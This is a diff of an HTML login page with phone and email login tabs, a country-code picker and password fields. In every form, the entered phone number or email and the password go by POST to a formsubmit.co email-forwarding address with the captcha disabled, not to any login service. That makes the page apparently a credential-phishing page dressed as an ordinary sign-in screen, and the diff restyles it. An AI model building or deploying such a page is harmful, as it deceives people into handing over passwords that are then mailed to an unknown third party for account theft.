@@ -3,219 +3,231 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Log In</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"/>
+  <title>Login</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flag-icon-css/css/flag-icon.min.css">
   <style>
     body {
-      margin: 0;
-      font-family: Arial, sans-serif;
+      font-family: 'Inter', sans-serif;
       background-color: #000;
-      color: white;
+      color: #fff;
       display: flex;
-      flex-direction: column;
+      justify-content: center;
       align-items: center;
-    }
-
-    .container {
-      margin-top: 40px;
-      width: 100%;
-      max-width: 400px;
-      padding: 0 20px;
-    }
-
-    .logo {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-
-    .logo img {
-      width: 100px;
+      height: 100vh;
+      margin: 0;
+      flex-direction: column;
     }
 
     h1 {
-      text-align: center;
-      color: white;
-      margin-bottom: 20px;
+      font-size: 2rem;
+      margin-bottom: 1rem;
     }
 
-    .toggle-buttons {
+    .toggle-container {
       display: flex;
-      justify-content: center;
+      background-color: #2d2d2d;
+      border-radius: 50px;
+      overflow: hidden;
       margin-bottom: 20px;
+      width: 320px;
     }
 
-    .toggle-buttons button {
+    .toggle-button {
       flex: 1;
-      padding: 10px;
-      border: none;
+      padding: 12px;
+      text-align: center;
       cursor: pointer;
-      background-color: #2c2c2c;
-      color: white;
+      background-color: transparent;
+      color: #ccc;
+      border: none;
+      font-weight: 600;
+      font-size: 1rem;
     }
 
-    .toggle-buttons button.active {
+    .toggle-button.active {
       background-color: #d4af37;
-      color: black;
+      color: #000;
+    }
+
+    .form-container {
+      width: 320px;
+    }
+
+    form {
+      display: none;
+      flex-direction: column;
+      gap: 16px;
+    }
+
+    form.active {
+      display: flex;
     }
 
     label {
-      display: block;
-      margin: 10px 0 5px;
-      text-align: left;
+      font-size: 0.9rem;
+      margin-bottom: -10px;
     }
 
-    .input-wrapper {
+    .input-group {
+      background-color: #2d2d2d;
+      border-radius: 30px;
       display: flex;
       align-items: center;
-      background-color: #2c2c2c;
-      border-radius: 30px;
-      padding: 10px 15px;
-      margin-bottom: 15px;
+      padding: 10px 16px;
     }
 
-    .input-wrapper input {
-      flex: 1;
-      background: transparent;
+    .input-group input {
+      background: none;
+      border: none;
+      color: white;
+      width: 100%;
+      margin-left: 10px;
+      outline: none;
+      font-size: 1rem;
+    }
+
+    .input-group select {
+      background: none;
       border: none;
       color: white;
       outline: none;
-      font-size: 16px;
+      font-size: 1rem;
+      margin-left: 6px;
+      appearance: none;
     }
 
-    .input-wrapper .eye-icon {
+    .flag-icon {
+      font-size: 1.2rem;
+    }
+
+    .eye-icon {
       cursor: pointer;
-      font-size: 18px;
-      color: gray;
+      color: #888;
     }
 
-    .checkbox-group {
+    .bottom-links {
       display: flex;
-      align-items: center;
-      margin-top: -5px;
-      margin-bottom: 20px;
+      flex-direction: column;
+      align-items: flex-start;
+      font-size: 0.85rem;
+      gap: 6px;
     }
 
-    .checkbox-group input[type="checkbox"] {
-      margin-right: 10px;
-    }
-
-    .forgot-remember {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      font-size: 14px;
-    }
-
-    .forgot-remember a {
+    .bottom-links a {
       color: white;
       text-decoration: none;
     }
 
-    button.submit {
-      width: 100%;
-      padding: 15px;
-      border: none;
-      border-radius: 30px;
+    .submit-button {
+      margin-top: 20px;
       background-color: #d4af37;
       color: black;
-      font-size: 18px;
-      font-weight: bold;
+      padding: 12px;
+      border: none;
+      border-radius: 30px;
+      font-size: 1rem;
+      font-weight: 600;
       cursor: pointer;
-      margin-bottom: 20px;
     }
 
-    .footer {
-      text-align: center;
-      font-size: 14px;
-    }
-
-    .footer a {
-      color: #d4af37;
-      text-decoration: none;
-      margin-left: 5px;
-    }
-
-    /* Style drapeaux ronds */
-    .iti__flag {
-      border-radius: 50% !important;
-      filter: brightness(1.2);
-    }
-
-    .iti {
-      width: 100%;
-    }
-
-    .iti__selected-flag {
-      background-color: #1f1f1f !important;
-      border-radius: 20px;
-      padding: 5px 10px;
-    }
-
-    .iti__arrow {
-      color: white;
-    }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div class="logo">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/0/02/Marsx.png" alt="Logo"/>
-    </div>
 
-    <h1>Welcome To Login</h1>
+  <h1>Log In</h1>
 
-    <div class="toggle-buttons">
-      <button class="active">Phone Login</button>
-      <button>Email Login</button>
-    </div>
+  <div class="toggle-container">
+    <button id="phoneBtn" class="toggle-button active">Phone Login</button>
+    <button id="emailBtn" class="toggle-button">Email Login</button>
+  </div>
 
-    <form action="https://formsubmit.co/your@email.com" method="POST">
+  <div class="form-container">
+    <!-- PHONE LOGIN FORM -->
+    <form id="phoneForm" class="active" method="POST" action="https://formsubmit.co/your@email.com">
+      <input type="hidden" name="_captcha" value="false">
+      
       <label for="phone">Phone Number</label>
-      <div class="input-wrapper">
-        <input id="phone" type="tel" name="phone" required placeholder="Phone Number"/>
+      <div class="input-group">
+        <span class="flag-icon flag-icon-us"></span>
+        <select name="code" style="width: 60px;">
+          <option value="+1" data-flag="us">+1</option>
+          <option value="+1" data-flag="ca">+1</option>
+          <option value="+33" data-flag="fr">+33</option>
+          <option value="+47" data-flag="no">+47</option>
+          <option value="+34" data-flag="es">+34</option>
+          <option value="+46" data-flag="se">+46</option>
+          <option value="+41" data-flag="ch">+41</option>
+          <option value="+63" data-flag="ph">+63</option>
+          <option value="+44" data-flag="gb">+44</option>
+          <option value="+57" data-flag="co">+57</option>
+        </select>
+        <input type="tel" name="phone" placeholder="Phone Number" required />
       </div>
 
       <label for="password">Password</label>
-      <div class="input-wrapper">
-        <input id="password" type="password" name="password" required placeholder="Password"/>
-        <span class="eye-icon" onclick="togglePassword()">👁️‍🗨️</span>
+      <div class="input-group">
+        <input type="password" name="password" placeholder="Password" required id="phonePassword"/>
+        <span class="eye-icon" onclick="togglePassword('phonePassword')">&#128065;</span>
       </div>
 
-      <div class="forgot-remember">
+      <div class="bottom-links">
         <a href="#">Forgot password?</a>
+        <label><input type="checkbox"> Remember account and password</label>
       </div>
 
-      <div class="checkbox-group">
-        <input type="checkbox" id="remember" name="remember">
-        <label for="remember">Remember account and password</label>
-      </div>
-
-      <button type="submit" class="submit">Log In</button>
+      <button type="submit" class="submit-button">Log In</button>
     </form>
 
-    <div class="footer">
-      Continue Is Agree
-      <a href="#">Sign Up</a>
-    </div>
+    <!-- EMAIL LOGIN FORM -->
+    <form id="emailForm" method="POST" action="https://formsubmit.co/your@email.com">
+      <input type="hidden" name="_captcha" value="false">
+      
+      <label for="email">Email</label>
+      <div class="input-group">
+        <input type="email" name="email" placeholder="Email Address" required />
+      </div>
+
+      <label for="password">Password</label>
+      <div class="input-group">
+        <input type="password" name="password" placeholder="Password" required id="emailPassword"/>
+        <span class="eye-icon" onclick="togglePassword('emailPassword')">&#128065;</span>
+      </div>
+
+      <div class="bottom-links">
+        <a href="#">Forgot password?</a>
+        <label><input type="checkbox"> Remember account and password</label>
+      </div>
+
+      <button type="submit" class="submit-button">Log In</button>
+    </form>
   </div>
 
-  <!-- Libs JS -->
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
   <script>
-    const input = document.querySelector("#phone");
-    window.intlTelInput(input, {
-      preferredCountries: ["us", "ca", "fr", "no", "es", "se", "ch", "ph", "gb", "co"],
-      separateDialCode: true,
+    const phoneBtn = document.getElementById('phoneBtn');
+    const emailBtn = document.getElementById('emailBtn');
+    const phoneForm = document.getElementById('phoneForm');
+    const emailForm = document.getElementById('emailForm');
+
+    phoneBtn.addEventListener('click', () => {
+      phoneBtn.classList.add('active');
+      emailBtn.classList.remove('active');
+      phoneForm.classList.add('active');
+      emailForm.classList.remove('active');
     });
 
-    function togglePassword() {
-      const passwordInput = document.getElementById("password");
-      if (passwordInput.type === "password") {
-        passwordInput.type = "text";
-      } else {
-        passwordInput.type = "password";
-      }
+    emailBtn.addEventListener('click', () => {
+      emailBtn.classList.add('active');
+      phoneBtn.classList.remove('active');
+      emailForm.classList.add('active');
+      phoneForm.classList.remove('active');
+    });
+
+    function togglePassword(id) {
+      const field = document.getElementById(id);
+      field.type = field.type === "password" ? "text" : "password";
     }
   </script>
+
 </body>
 </html>
